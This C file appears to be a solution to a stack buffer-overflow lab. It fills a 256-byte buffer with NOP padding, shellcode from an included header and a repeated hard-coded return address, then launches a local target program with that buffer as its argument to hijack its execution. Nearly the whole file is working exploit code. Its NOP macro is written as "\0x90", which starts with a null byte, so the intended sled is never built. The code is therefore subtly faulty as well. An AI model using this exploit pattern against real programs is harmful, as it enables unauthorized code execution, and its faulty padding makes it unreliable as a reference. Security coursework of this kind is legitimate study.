#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define NOP "\0x90"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char exploit[256];
	strcpy(exploit, NOP);
	int i=0;
	for(i=0;i<15;i++){
	  strcat(exploit, NOP);
	}
	strcat(exploit, shellcode);
	int remain = (strlen(exploit)+1)%4;
	if(remain !=0){
	  for(i=0;i<=remain;i++){
	    strcat(exploit, NOP);
	  }
	}
	while(strlen(exploit)<=120){
	  strcat(exploit, "\x10\xfe\x21\x20");
	}
	
	args[0] = TARGET;
	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
